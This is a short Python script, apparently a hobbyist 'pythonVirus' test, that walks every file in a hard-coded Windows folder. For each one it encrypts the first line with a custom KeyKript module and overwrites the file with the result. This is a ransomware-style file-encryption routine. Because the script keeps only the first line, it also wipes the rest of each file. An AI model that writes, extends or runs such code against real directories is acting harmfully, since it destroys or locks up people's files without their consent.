import KeyKript
import os

os.system("echo Hi: This is a simple test")

path = "C:\\Users\\Mason Mollenkamp\\Desktop\\repo\\mathon\\hackerstuff\\pythonVirus\\Test\\" #file encript
directories = os.listdir(path)

for file in directories:
    encriptedFile = KeyKript.ecdc(5, 91, "e", str(open(path + file, "r+").readlines()[0]))
    print(encriptedFile)
    open(path + file, "w").write(str(encriptedFile))

